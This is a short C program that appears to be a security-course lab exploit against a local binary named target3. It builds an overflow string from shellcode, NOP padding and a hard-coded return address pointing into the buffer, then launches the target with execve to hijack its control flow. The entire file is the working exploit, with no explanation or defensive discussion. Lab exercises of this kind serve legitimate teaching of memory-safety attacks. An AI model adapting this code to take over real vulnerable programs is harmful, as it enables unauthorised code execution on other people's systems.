#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
int rip_addr = 0x2021fe98;
int buf_addr = 0x2021fe50 + strlen("AAAA");
char buf_addr_str[] = "\x54\xfe\x21\x20";

int
main ( int argc, char * argv[] )
{
    char *args[3];
    char *env[1];

    args[0] = TARGET;

    int str_len = (rip_addr + 4) - buf_addr;
    char exploit_str[str_len];
    memset(exploit_str, 0, str_len);
    strcpy(exploit_str, shellcode);
    int pos = strlen(shellcode);
    while(pos < rip_addr - buf_addr) {
        strcat(exploit_str, NOP);
        ++pos;
    }
    strcpy(exploit_str + rip_addr - buf_addr, buf_addr_str);
    args[1] = exploit_str;
    args[2] = NULL;

    env[0] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}
